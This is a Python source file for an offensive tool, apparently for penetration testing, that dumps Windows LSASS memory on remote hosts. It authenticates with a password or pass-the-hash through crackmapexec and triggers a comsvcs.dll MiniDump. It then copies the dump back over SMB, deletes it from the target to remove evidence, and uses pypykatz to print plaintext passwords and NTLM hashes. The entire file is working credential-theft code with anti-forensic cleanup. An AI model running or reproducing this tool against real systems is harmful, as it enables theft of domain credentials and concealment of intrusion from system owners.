import argparse
import sys
import subprocess
import re
import os
import shlex
import time
import json
from collections import defaultdict
from itertools import islice

#Add Colors
class bcolors:
    RED = '\033[1;31m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[94m'
    LIGREEN = '\033[92m'
    GREEN = '\033[0;32m'
    NORMAL = '\033[0m'
    TAN = '\033[0;33;33m'


title = "\n\n\n"
title += ""
title +="            "+bcolors.TAN +"_"+bcolors.NORMAL +"))               __  __ _           _                   _ \n"     
title +="           "+bcolors.TAN +"> "+bcolors.RED +"*"+bcolors.TAN +"\     _~"+bcolors.NORMAL +"       |  \/  (_)_ __ ___ (_) __ _  ___   __ _| |_ ____\n"
title +="           "+bcolors.TAN +"`"+bcolors.NORMAL +";"+bcolors.TAN +"'\\__-' \_ "+bcolors.NORMAL +"      | |\/| | | '_ ` _ \| |/ _` |/ _ \ / _` | __|_  /\n"
title +="              "+bcolors.TAN +"| )  _ \ \\"+bcolors.NORMAL +"     | |  | | | | | | | | | (_| | (_) | (_| | |_ / / \n"
title +="  ejm97      "+bcolors.TAN +"/ / ``   "+bcolors.NORMAL +"w w    |_|  |_|_|_| |_| |_|_|\__, |\___/ \__,_|\__/___|\n"
title +="            w w                                    |___/                     \n"
title +="\n"
title +="                              Version 1.0.3b | Written by Adam Logue & Ryan Griffin\n"
title +="\n"
title +="Special Thanks: Richard Young, Frank Scarpella, Zach Warren, Michael Howard, and Piero Picasso.\n"

print title
# parse the arguments
group = argparse.ArgumentParser(description='Alternative Mimikatz LSASS DUMPER')
group.add_argument('-d',metavar='DOMAIN', help='Domain.',required=False)
group.add_argument('-p',metavar='PASSWORD', help='Password.',required=False)
group.add_argument('-t',metavar='TARGET', help='Single Target',required=False)
group.add_argument('-u',metavar='USERNAME', help='Username.',required=False)
group.add_argument('-f',metavar='FILE', help='File Containing One Host Per Line.',required=False)
group.add_argument('-H',metavar='HASH', help='Pass the Hash', required=False)
group.add_argument('--local', help='Use Local Authentication', action='store_true',required=False)
args = group.parse_args()
if len(sys.argv)==1:
    group.print_help(sys.stderr)

#Add Colors
class bcolors:
    RED = '\033[1;31m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[94m'
    LIGREEN = '\033[92m'
    GREEN = '\033[0;32m'
    NORMAL = '\033[0m'

#Functions
def hostsToList(): # takes -f input file and puts it into a list
    with open(args.f) as targetfile:
        hosts = [line.strip() for line in targetfile]
        targetfile.close()
        return hosts 

def getLSASSPID(target): #Get PID of LSASS Process
    print (bcolors.BLUE +"[*]" + bcolors.NORMAL +" Target: " + target)
    ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]') #regex to escape colors from CME
    if args.local is True and args.H:
        if ":" not in args.H:
            args.H = "aad3b435b51404eeaad3b435b51404ee:" + args.H
        cmeHashLocal = args.H.split(":")[1]
    print (bcolors.LIGREEN + "[+]" + bcolors.NORMAL + " Obtaining LSASS PID:")
    if args.H and not args.local:
        findPID = subprocess.Popen(['crackmapexec', target, '-d',args.d, '-u', args.u, '-H', args.H, '-x "tasklist /v"'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    elif args.H and args.local:
        findPID = subprocess.Popen(['crackmapexec', target, '-u', args.u, '-H', cmeHashLocal, '--local-auth', '-x "tasklist /v"'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    elif args.p and not args.local:
        findPID = subprocess.Popen(['crackmapexec', target, '-d', args.d, '-u', args.u, '-p', args.p, '-x "tasklist /v"'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    elif args.p and args.local:
        findPID = subprocess.Popen(['crackmapexec', target, '-u', args.u, '-p', args.p, '--local-auth', '-x "tasklist /v"'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    elif args.H and args.p:
        print (bcolors.RED + "[!]" + bcolors.NORMAL + " Error, cannot supply both a password and a hash!\n")
        sys.exit()
    for line in findPID.stdout:
        if "lsass" in line:
            lsass = ansi_escape.sub('', line) #Extract tasklist lsass.exe process
            lsassList = lsass.split(" ")
            for i, item in enumerate(lsassList): #find PID because different versions of CME use different spacing
                if "Services" in item:
                    lsassPID = lsassList[i - 1] #Find Services item and walk one item back to grab PID
            sys.stdout.flush()
            sys.stdout.write(bcolors.LIGREEN + "\033[F[+]" + bcolors.NORMAL + " Obtaining LSASS PID: " + bcolors.YELLOW + lsassPID + bcolors.NORMAL +"\n")
    try:
        return lsassPID
    except:
        print "Error Getting PID"
        pass

def removeDumpFileEvidence(target): # remove dump file from target
    if args.H:
        cmd = '/usr/local/bin/smbclient.py ' + args.u + '@' + target + ' -hashes ' + args.H
    elif args.p:
        cmd = '/usr/local/bin/smbclient.py ' + args.u + ":" + args.p + '@' + target 
    print "[+] Removing Evidence from Target"
    smbclient = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = smbclient.communicate('use c$\nrm lsass.dmp\nls\n')
    if "lsass.dmp" in str(output):
        sys.stdout.flush()
        sys.stdout.write(bcolors.RED + "\033[F[-]" + bcolors.NORMAL + " Removing Evidence from Target..." + bcolors.RED + "Failed!" + bcolors.NORMAL + "\n")
        return False
    else:
        sys.stdout.flush()
        sys.stdout.write(bcolors.LIGREEN + "\033[F[+]" + bcolors.NORMAL + " Removing Evidence from Target..." + bcolors.LIGREEN + "Success!" + bcolors.NORMAL + "\n")
        return True
    
    return

def exfilDumpFile(target): #get lsass.dmp
    if args.H:
        cmd = '/usr/local/bin/smbclient.py ' + args.u + '@' + target + ' -hashes ' + args.H
    if args.p:
        cmd = '/usr/local/bin/smbclient.py ' + args.u + ":" + args.p + '@' + target
    print "[+] Exfiltrating Dump"
    smbclient = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = smbclient.communicate('use c$\nget lsass.dmp\n')
    if os.path.exists("lsass.dmp") == True:
        sys.stdout.flush()
        sys.stdout.write(bcolors.LIGREEN + "\033[F[+]" + bcolors.NORMAL + " Exfiltrating Dump..." + bcolors.LIGREEN + "Success!" + bcolors.NORMAL + "\n")
        return True
    else:
        time.sleep(5) #File probably didn't finish writing so wait a few more seconds and check again
        if os.path.exists("lsass.dmp") == True:
            sys.stdout.flush()
            sys.stdout.write(bcolors.LIGREEN + "\033[F[+]" + bcolors.NORMAL + " Exfiltrating Dump..." + bcolors.LIGREEN + "Success!" + bcolors.NORMAL + "\n")
            return True
        sys.stdout.flush()
        sys.stdout.write(bcolors.RED + "\033[F[-]" + bcolors.NORMAL + " Exfiltrating Dump..." + bcolors.RED + "Failed!" + bcolors.NORMAL + "\n")  
        return False

def validateProcDump(target): # Run smbclient to see if successfully dumps to C:\lsass.dmp
    if args.H:
        cmd = '/usr/local/bin/smbclient.py ' + args.u + '@' + target + ' -hashes ' + args.H
    if args.p:
        cmd = '/usr/local/bin/smbclient.py ' + args.u + ":" + args.p + '@' + target
    print (bcolors.LIGREEN + "[+]" + bcolors.NORMAL + " Validating Dump")
    smbclient = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = smbclient.communicate('use c$\nls\n')
    if "lsass.dmp" in str(output):
        return True
    else:
        time.sleep(5)
        smbclient = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        outputSecondTry = smbclient.communicate('use c$\nls\n')
        if "lsass.dmp" in str(outputSecondTry):
            return True
        return False

def performProcDump(PID, target):
    if PID == False:
        return False
    if args.H and not args.local:
        cmd = 'crackmapexec ' + target + ' -d ' + args.d + ' -u ' + args.u + ' -H ' + args.H + ' -x \'powershell -c \"rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ' + str(PID) + ' C:\\lsass.dmp full\"\''
    if args.H and args.local:
        cmd = 'crackmapexec ' + target + ' -u ' + args.u + ' -H ' + args.H + ' --local-auth -x \'powershell -c \"rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ' + str(PID) + ' C:\\lsass.dmp full\"\''
    if args.p and not args.local:
        cmd = 'crackmapexec ' + target + ' -d ' + args.d + ' -u ' + args.u + ' -p ' + args.p + ' -x \'powershell -c \"rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ' + str(PID) + ' C:\\lsass.dmp full\"\''
    if args.p and args.local:
        cmd = 'crackmapexec ' + target + ' -u ' + args.u + ' -p ' + args.p + ' --local-auth -x \'powershell -c \"rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ' + str(PID) + ' C:\\lsass.dmp full\"\''
    print "[+] Dumping LSASS"
    procDump = subprocess.Popen(shlex.split(cmd),stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    didItWork = validateProcDump(target)
    if didItWork == True:
        sys.stdout.flush()
        sys.stdout.write(bcolors.LIGREEN + "\033[F\033[F[+]" + bcolors.NORMAL + " Dumping LSASS..." + bcolors.LIGREEN + "Success!" + bcolors.NORMAL + "\n")     
        return True
    elif didItWork == False:
        sys.stdout.flush()
        sys.stdout.write(bcolors.RED + "\033[F\033[F[-]" + bcolors.NORMAL + " Dumping LSASS..." + bcolors.RED + "Failed!" + bcolors.NORMAL + "\n")
        if args.f: # Retry Dump again just in case since we're providing a list of targets
            sys.stdout.write(bcolors.BLUE + "\033[F\033[F[*]" + bcolors.NORMAL + " Retrying LSASS Dump...\n")
            procDump = subprocess.Popen(shlex.split(cmd),stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            didItWork = validateProcDump(target)
            if didItWork == True:
                sys.stdout.flush()
                sys.stdout.write(bcolors.LIGREEN + "\033[F\033[F[+]" + bcolors.NORMAL + " Retrying LSASS Dump..." + bcolors.LIGREEN + "Success!" + bcolors.NORMAL + "\n")     
                return True
            elif didItWork == False:
                sys.stdout.flush()
                sys.stdout.write(bcolors.RED + "\033[F\033[F[-]" + bcolors.NORMAL + " Retrying LSASS Dump..." + bcolors.RED + "Failed!" + bcolors.NORMAL + "\n")
                print ("\n")
                return False

def performPypykatz(target):
    cmd = 'pypykatz lsa --json -o pypykatz_'+ target + '.json' + ' minidump lsass.dmp'
    print "[+] Extracting Secrets"
    doThePypykatz = subprocess.Popen(shlex.split(cmd),stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if os.path.exists("pypykatz_" + target + '.json') == True:
        sys.stdout.flush()
        sys.stdout.write(bcolors.LIGREEN + "\033[F[+]" + bcolors.NORMAL + " Extracting Secrets..." + bcolors.LIGREEN + "Success!" + bcolors.NORMAL + "\n")
        print ("\n")
        return True
    elif os.path.exists("pypykatz_" + target + '.json') == False:
        time.sleep(5) #wait for file to be created because pypyKatz probably didn't finish doing it's thing the first time.
        if os.path.exists("pypykatz_" + target + '.json') == True:
            sys.stdout.flush()
            sys.stdout.write(bcolors.LIGREEN + "\033[F[+]" + bcolors.NORMAL + " Extracting Secrets...Success!" + bcolors.NORMAL + "\n")
            print ("\n")
            return True
        sys.stdout.flush()
        sys.stdout.write(bcolors.RED + "\033[F[-]" + bcolors.NORMAL + " Extracting Secrets..." + bcolors.RED + "Failed!" + bcolors.NORMAL + "\n")
        print ("\n")
        return False

def displayCreds(target):
    msvDict = {}
    wdigestDict = {}
    sspDict = {}
    sortedResults = []
    with open ("pypykatz_" + target + '.json',"r") as file:
        jsonFileData = json.load(file)
        
        for jsonData in jsonFileData["lsass.dmp"]["logon_sessions"]:

            
            # Get the unique MSV Information from LSASS
            msvCreds = jsonFileData["lsass.dmp"]["logon_sessions"][jsonData]["msv_creds"]
            for data in msvCreds:
                if data["username"] not in msvDict:
                    msvDict.update({data["username"] : [[data["LMHash"],data["NThash"],data["domainname"]]]})
                else:
                    if [data["LMHash"],data["NThash"],data["domainname"]] not in msvDict[data["username"]]:
                        msvDict[data["username"]].append([data["LMHash"],data["NThash"],data["domainname"]])

            # Get the unique wDigest Information from LSASS
            wdigestCreds = jsonFileData["lsass.dmp"]["logon_sessions"][jsonData]["wdigest_creds"]
            for data in wdigestCreds:
                if data["password"] != None:
                    if data["username"] not in wdigestDict:
                        wdigestDict.update({data["username"] : [[data["password"],data["domainname"]]]})
                    else:
                        wdigestDict[data["username"]].append([data["password"],data["domainname"]])

            # Get the unique SSP Information from LSASS
            sspCreds = jsonFileData["lsass.dmp"]["logon_sessions"][jsonData]["ssp_creds"]
            for data in sspCreds:
                if data["password"] != None:
                    if data["username"] not in sspDict:
                        sspDict.update({data["username"] : [[data["password"],data["domainname"]]]})
                    else:
                        sspDict[data["username"]].append([data["password"],data["domainname"]])

        #print wdigest from LSASS JSON file
        if wdigestDict:    
            print (bcolors.LIGREEN + "[+]" + bcolors.BLUE + " wdigest:" + bcolors.NORMAL)
            for username, userInfo in wdigestDict.iteritems():
                for item in userInfo:
                    print (bcolors.YELLOW + "\t%s\%s:%s" % (item[1],username,item[0]) + bcolors.NORMAL)
        
        #print credssp from LSASS JSON file
        if sspDict:
            print (bcolors.LIGREEN + "[+]" + bcolors.BLUE + " credssp:" + bcolors.NORMAL)
            for username, userInfo in sspDict.iteritems():
                for item in userInfo:
                    if item[1] == '':
                        print (bcolors.YELLOW + "\t.\%s:%s" % (username,item[0]) + bcolors.NORMAL)
                    else:
                        print (bcolors.YELLOW + "\t%s\%s:%s" % (item[1],username,item[0]) + bcolors.NORMAL)
        
        #print msv from LSASS JSON file
        if msvDict:
            print (bcolors.LIGREEN + "[+]" + bcolors.BLUE + " msv:" + bcolors.NORMAL)
            for username, userInfo in msvDict.iteritems():
                for item in userInfo:
                    if item[0] == None:
                        print (bcolors.YELLOW + "\t%s\%s:aad3b435b51404eeaad3b435b51404ee:%s" % (item[2],username,item[1]) + bcolors.NORMAL)
                    else:
                        print (bcolors.YELLOW + "\t%s\%s:%s:%s" % (item[2],username,item[0],item[1]) + bcolors.NORMAL)
       
            
    file.close()    
    return    
 

#CALL FUNCTIONS

if args.t:
    PID = getLSASSPID(args.t)
    if PID is not False:
        performProcDump(PID, args.t)
        if exfilDumpFile(args.t) == True:
            removeDumpFileEvidence(args.t)
            performPypykatz(args.t)
            displayCreds(args.t)
        else:
            sys.exit()
elif args.f:
    for host in hostsToList():
        PID = getLSASSPID(host)
        if PID is not False:
            performProcDump(PID, host)
            if exfilDumpFile(host) == True:
                removeDumpFileEvidence(host)
                performPypykatz(host)
                displayCreds(host)

print (bcolors.BLUE + "\n[*]" + bcolors.NORMAL + " Done!\n\n")